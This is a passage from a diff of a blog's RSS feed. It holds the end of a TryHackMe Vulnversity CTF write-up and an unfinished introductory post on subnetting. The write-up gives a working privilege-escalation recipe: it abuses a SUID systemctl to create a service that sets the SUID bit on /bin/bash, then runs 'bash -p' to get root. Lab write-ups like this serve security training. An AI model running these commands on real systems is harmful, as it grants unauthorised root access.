+t seems like one way to exploit that SUID set systemctl is creating a temporary service.Since systemctl’s burden is coordinate the services, it makes sense.However we will need to configure that service file.&lt;/p&gt;
+&lt;h4 id=&quot;service-file&quot;&gt;Service file&lt;/h4&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;TF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;.service
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;[Service]
+Type=oneshot
+ExecStart=/bin/bash -c &quot;chmod +s /bin/bash&quot;
+[Install]
+WantedBy=multi-user.target&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+/bin/systemctl &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+/bin/systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I have manually changed the systemctl location in the given code from relative to static directory,and also ExecStart will set SUID perm to /bin/bash.&lt;/p&gt;
+
+&lt;p&gt;Copy and paste the lines given above to shell (Press enter two times after you paste it), and than check the /bin/bash’s file permissions.
+&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln19.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+As you can see, /bin/bash binary now have ‘s’ permission, which indicates that it is a SUID executable.
+&lt;br /&gt;Run:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h4 id=&quot;2-root-flag&quot;&gt;2-Root Flag&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln20.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+As you can see euid (Effective user id) set to 0 which belongs to root.Now you can get the root flag.&lt;/p&gt;
+
+&lt;p&gt;That is all for this machine, thank you for reading :)&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 09 Oct 2021 18:04:00 +0100</pubDate>
+        <link>http://localhost:4000/2021/10/09/tryhackme-vulnversity-ctf-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/10/09/tryhackme-vulnversity-ctf-writeup/</guid>
+        
+        <category>ctf</category>
+        
+        <category>pentesting</category>
+        
+        <category>linux-privesc</category>
+        
+        <category>bruteforce</category>
+        
+        <category>cracking</category>
+        
+        <category>reverse-shell</category>
+        
+        <category>php</category>
+        
+        <category>shell-injection</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Subnetting</title>
+        <description>&lt;hr /&gt;
+&lt;p&gt;author: krygennn
+date: 2021-11-18 12:00
+categories: [Blogging, Networking]
+image:
+    src: /assets/img/posts/subnetting/subnetting1.jpg
+    alt: SUBNETTING
+    width: 800
+    height: 450&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;what-is-subnetting-&quot;&gt;WHAT IS SUBNETTING ?&lt;/h1&gt;
+
+&lt;p&gt;As the name suggest, subnetting means dividing a network into sub sub branches. For example, you have a class with 50 students,
+if you divide them into two groups, you will have two subclasses, 25 students per class. Subetting is just the same however,
+instead of class, this time it is the network which is going to be divided into &lt;strong&gt;smaller chunks&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;why-using-subnetting-&quot;&gt;WHY USING SUBNETTING ?&lt;/h1&gt;
+
+&lt;p&gt;Subnets provide efficiency for networks. Imagine you want to send a message to your dear friend Jack, who lives in the flat
+next to you. Would you deliver the message to some international package delivery service, or to your local post office ?
+If you were to hand out your message to international package delivery service, it would take way too long to deliver it from
+you to your dear friend Jack, due to bigger scale regulations, procedures etc. Probably your message will be carried out to some
+far located central warehouse to wait for dispersion, and the message you want to send to Jack will need to travel hundreds of more miles
+. As you can see it is painful and costly.
+&lt;br /&gt;&lt;br /&gt;
+Just like in the example, when we are talking about network, we are actually sending messages to our friends or someone else. It is 
+much more efficient, time and cost-saving way to communicate without roaming through all the routers in companies’
+network just to reach some node sitting next to us, a co-worker from IT department for example.
+&lt;br /&gt;&lt;br /&gt;
+Instead of having one big network for a company, we can divide the departments into smaller chunks. For instance, one subnet for 
+IT department and one for Human Resources department prevents interference between those two departments. It is not needed
+both for them to see each other’s traffic as they are completely different departments.&lt;/p&gt;
+
+&lt;h2 id=&quot;benefits-of-using-subnets&quot;&gt;Benefits of using subnets&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Network Security and&lt;br /&gt;Management Easiness&lt;/td&gt;
+      &lt;td&gt;Subnetting facilitates network management for network administrators,&lt;br /&gt;thus, more detailed traffic control can be implemented. It also reduces &lt;br /&gt;the risk of spread by quarantining compromised network sections.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Reduces Traffic Congestion&lt;/td&gt;
+      &lt;td&gt;Subnet Mask guarantees that traffic remains within the assigned subnet.&lt;br /&gt;This reduces extensive congestion and diminishes the load on the network.&lt;br /&gt; In subnets, less distance needs to be travelled for any data, less likely to lose &lt;br /&gt;data.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Improve Speed and Performance&lt;/td&gt;
+      &lt;td&gt;After sending a broadcast message, every device on the network will &lt;br /&gt;receive and reply to that message even though the message is not relevant &lt;br /&gt;for most of the machines.By doing that, network capacity and bandwidth &lt;br /&gt;getting drained.However, with subnets only the relevant machines are in&lt;br /&gt; communication.This means performance !&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Before moving any further, I highly recommend you to read &lt;a href=&quot;https://krygennn.github.io/posts/ipv4-addresses&quot;&gt;&lt;strong&gt;IPv4 Protocol&lt;/strong&gt;&lt;/a&gt; blogpost first.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+To be continued&lt;/p&gt;
+</description>
+        <pubDate>Sat, 09 Oct 2021 00:59:00 +0100</pubDate>
+        <link>http://localhost:4000/2021/10/09/subnetting/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/10/09/subnetting/</guid>
+        
+        <category>subnetting</category>
+        
+        <category>switch</category>
+        
+        <category>router</category>
+        
+        
+      </item>
     
       <item>
         <title>Tryhackme Blue Ctf Writeup</title>
